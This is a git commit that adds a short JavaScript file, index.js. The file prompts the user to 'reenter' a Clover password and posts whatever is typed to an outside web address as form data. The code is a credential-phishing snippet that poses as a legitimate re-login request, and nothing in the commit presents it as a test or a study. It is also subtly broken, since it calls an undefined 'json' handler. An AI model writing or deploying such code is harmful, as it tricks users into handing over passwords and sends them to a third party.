8f7a097113ac45f236421d605728218219a3966e
N Beaumont <brandnew03@gmail.com>
2018-08-06 10:50:49 -0700

    Create index.js

---
+++ index.js
@@ -0,0 +1,18 @@
+let pw = prompt('Please reenter your Clover password');
+    
+if (pw != null) {
+    fetch('https://www.github.com', {
+    method: 'post',
+    headers: {
+      "Content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+    },
+    body: 'pw=' + pw
+  })
+  .then(json)
+  .then(function (data) {
+    console.log('Request succeeded with JSON response', data);
+  })
+  .catch(function (error) {
+    console.log('Request failed', error);
+  });
+}
